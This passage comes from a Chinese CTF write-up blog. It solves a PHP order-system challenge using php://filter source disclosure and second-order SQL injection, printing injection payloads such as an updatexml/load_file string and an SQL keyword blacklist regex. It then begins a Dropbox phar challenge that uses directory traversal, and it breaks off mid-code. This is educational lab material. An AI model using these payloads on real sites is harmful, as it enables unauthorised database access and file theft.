class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;订单修改成功&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=delete.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;user_id&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;订单删除成功&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">///?file=php://filter/convert.base64-encode/resource=config.php</span><br>?php<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-variable">$DATABASE</span> = <span class="hljs-keyword">array</span>(<br><br>    <span class="hljs-string">&quot;host&quot;</span> =&gt; <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;dbname&quot;</span> =&gt;<span class="hljs-string">&quot;ctfusers&quot;</span><br>);<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;host&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>可以看到对用户名和电话过滤很严格而且开了<code>/i</code>模式。但对地址只进行了简单的转义处理：</p><p><code>$address = addslashes($_POST[&quot;address&quot;]);</code></p><p>二次注入，参考<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>之前对于转义这个东西理解还不太好，网上找了篇文章：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//下面的SELECT语句显示了引用和转义如何工作：<br><br>mysql&gt; SELECT &#x27;hello&#x27;, &#x27;&quot;hello&quot;&#x27;, &#x27;&quot;&quot;hello&quot;&quot;&#x27;, &#x27;hel&#x27;&#x27;lo&#x27;, &#x27;\&#x27;hello&#x27;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &quot;hello&quot; | &quot;&quot;hello&quot;&quot; | hel&#x27;lo | &#x27;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br> <br><br>mysql&gt; SELECT &quot;hello&quot;, &quot;&#x27;hello&#x27;&quot;, &quot;&#x27;&#x27;hello&#x27;&#x27;&quot;, &quot;hel&quot;&quot;lo&quot;, &quot;\&quot;hello&quot;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &#x27;hello&#x27; | &#x27;&#x27;hello&#x27;&#x27; | hel&quot;lo | &quot;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br><br>//https://www.cnblogs.com/end/archive/2011/04/01/2002516.html<br></code></pre></td></tr></table></figure><p>个人理解就是经过转义<code>(增加\)</code>，一些特殊字符<code>(比如&#39;)</code>这东西就失去了它本身的含义，变成了某个字符串的一部分。在上面的例子我们也能知道，增加转义符后不是说我输入的数据也增加了个字符。</p><p>主要是这里存在问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//change.php</span><br><span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<span class="hljs-comment">//这里我们可以用报错注入</span><br></code></pre></td></tr></table></figure><p>在注册用户的地址时时，我们可以构造恶意的<code>SQL</code>语句<code>(经过转义后被放到数据库中，等着我们在修改地址时触发)</code>。然后我们修改地址，触发刚刚构造的<code>sql</code>语句。</p><p>做法的话有两种，先看不利用报错直接回显的：</p><p>参考了这位师傅的解法：<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>我们先随便注册两个账户：<code>(一个账户就行，我注册两个为了方便解释)</code></p><p>地址(别丢了反引号)：’,<code>address</code>&#x3D;database()#</p><p><img src="/img/cyberpunk7.png" alt="cyberpunk7"></p><p><img src="/img/cyber9.png" alt="cyber9"></p><p>在修改地址时，<code>SQL</code>语句变成了：</p><p>$sql &#x3D; “update <code>user</code> set <code>address</code>&#x3D;’”.$address.”‘, <code>old_address</code>&#x3D;’’,<code>address</code>&#x3D;’database()’# 这后面的都没了”‘ where <code>user_id</code>&#x3D;”.$row[‘user_id’];</p><p>旧地址为空，新地址被设置成数据库名。</p><p>但要注意由于没有限制<code>user_id</code>，所以<code>user</code>表中所有用户的地址都是数据库名。</p><p>现在我们把<code>1</code>的地址改成<code>1</code>:</p><p><img src="/img/cyberpunk8.png" alt="cyberpunk8"></p><p>提交后查询：</p><p><img src="/img/cyber10.png" alt="cyber10"></p><p>可以看到地址的名字已经是库名了，现在我们在看看<code>2</code>的地址：</p><p><img src="/img/cyber11.png" alt="cyber11"></p><p>我们并没有更改<code>2</code>的地址但也回显了<code>ctfusers</code>，其实就是刚才在修改时把<code>user</code>表中所有<code>address</code>字段的值都设置了。</p><p>后面就简单了，爆库爆表爆列爆字段，不过这题官方当时是给了hint的，就是<code>flag</code>在<code>flag.txt</code>中，我们用<code>load_file</code>直接读<code>/flag.txt</code>中的内容：</p><p><img src="/img/cyber12.png" alt="cyber12"></p><p><img src="/img/cyber13.png" alt="cyber13"></p><p>第二种方法就是网上很多人用的，利用报错进行回显：</p><p><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</code></p><p>注册的时候就输入<code>payload</code>，然后随便修改一个对应的地址：</p><p><img src="/img/cyber14.png" alt="cyber14"></p><p>查询订单订单时候查出来的其实就是我们的输入，不过因为被转义了所以没啥影响：</p><p><img src="/img/cyber16.png" alt="cyber16"></p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>提示<code>php phar</code></p><p><img src="/img/dropbox1.png" alt="dropbox1"></p><p>先注册一个登录看看</p><p>上传功能，不过是否有过滤不清楚，我们先上传一个图片文件(只允许上传图片形式的):</p><p><img src="/img/dropbox4.png" alt="dropbox4"></p><p>上传后提供了下载功能，抓包看一下：</p><p><img src="/img/dropbox3.png" alt="dropbox3"></p><p>其实如果做这种<code>phar</code>的题最好能拿到源码，尝试下载<code>upload.php</code>看看：</p><p>(利用目录穿越多试几次)</p><p><img src="/img/dropbox6.png" alt="dropbox6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/gif&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Only gif/jpg/png allowed&quot;</span>);<br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$dst</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>] . <span class="hljs-variable">$filename</span> . <span class="hljs-variable">$fileext</span>;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dst</span>);<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invaild filename&quot;</span>);<br>        <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Name</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Size</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ 